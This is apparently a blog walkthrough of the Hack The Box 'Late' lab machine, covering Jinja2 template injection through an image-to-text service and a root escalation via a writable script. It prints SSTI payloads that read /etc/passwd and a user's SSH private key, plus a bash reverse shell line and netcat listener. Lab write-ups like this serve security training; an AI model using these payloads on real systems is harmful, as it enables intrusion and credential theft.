# :game_die: Late Hack the box Writeup. So today we are going to discuss about…

---

# Late Hack the box Writeup

Hey, guys welcome to my blog today we are going to discuss about the late hack-the-box machine. This is a very interesting machine that comes up with SSTI injection and normal privilege escalation to get the root access.

You will think this is the very easiest machine but the real fact is it's the hardest machine compared to others. you will learn a lot through this machine.

- Enumeration

- Adding subdomain

- Getting user shell access

- Privilege escalation

- Getting Root shell

## Enumeration

So as usual we start up with a nmap scan

>

STEP 1: nmap -sC -sV 10.10.11.156

Here the normal ports are opened

Let us look out that web page which is [http://10.10.11.156](http://10.10.11.156)

Further reviewing the source code I found the subdomain.

## Adding subdomain

So add this subdomain to */etc/hosts* file

>

STEP 2: image.late.htb late.htb >> /etc/hosts

Now you get access to the *image.late.htb*

First I tried to upload the reverse shell in the image but it did not work. so After a long time, I found that this web page converting the image to a text file and as a result, it just prints something in <p></p> tag and it removing some special character ( _ , ). Something abnormal

so I tried the simple SSTI injection{{7*7}} and you need to convert this text file into an image you can take a screenshot on your PC or use the below website

In the result, You get the answer 49 so I found that it was affected by *SSTI injection*.

Read this below article to get more ideas

Further, I tried a lot of methods to exploit this but I got stuck.

so handle this part very carefully because in this part you need to be patient and don’t leave the trying keep doing your best.

You can use the below GitHub for the payload

Jinja2 — Write into remote file

By using this payload we going to get the /etc/passwd file in that machine

```
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}
```

Now you will get the password list in the result file.

And you can able to see the system user in the group of 1000

```
{{ get_flashed_messages.__globals__.__builtins__.open("/home/svc_acc/.ssh/id_rsa").read() }}
```

hurrhhhhh!!!!

## Get Vicky’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Now you will get the id_rsa file which we can use to login through ssh

And remove <p> from that file

>

STEP 3: chmod 600 id_rsa

## Getting user shell access

>

STEP 3: ssh -i id_rsa svc_acc@10.10.11.156

Boooooooooooooommmmmm!!!!!

Now you get the userflag which is user.txt

>

STEP 4: cat user.txt

## Privilege escalation

Next, we going to get a root shell by using the[linpeas.sh](https://github.com/Cerbersec/scripts/blob/master/linux/linpeas.sh)

Further analyzing this report I have found that one of the root file has writing permission which is /usr/local/sbin/ssh-alert.sh

In this file, the user can able to write anything and it has root permission also. so we going to write a reverse shell in that file

I have tried to write a reverse shell using the nano tool but the operation is not permitted in that file.

So tried another method which is to append the two file

First, we going to create the reverse shell in one file

```
bash -i >& /dev/tcp/10.10.11.15/4242 0>&1
```

Set your listener in your local machine

>

STEP 5: nc -lvp 4242

Next, append this file to ssh-alert.sh.

>

STEP 6: cat /tmp/nep.txt >> /usr/local/sbin/ssh-alert.sh

Now cut your ssh connection and log in again to that through the ssh connection you will get the reverse shell in netcat.

Boooooooooommmmmmm!!!!

Now you can able see the root flag which root.txt

>

STEP 7: cat root.txt

Thank you kavigihan.

This is an amazing machine[kavigihan](https://app.hackthebox.com/users/badges/389926) I played it because I learned a lot through it and the most thing is to be patient I learned through this machine.

I hope you will understand this article if you like this please support me

OWSP student

---
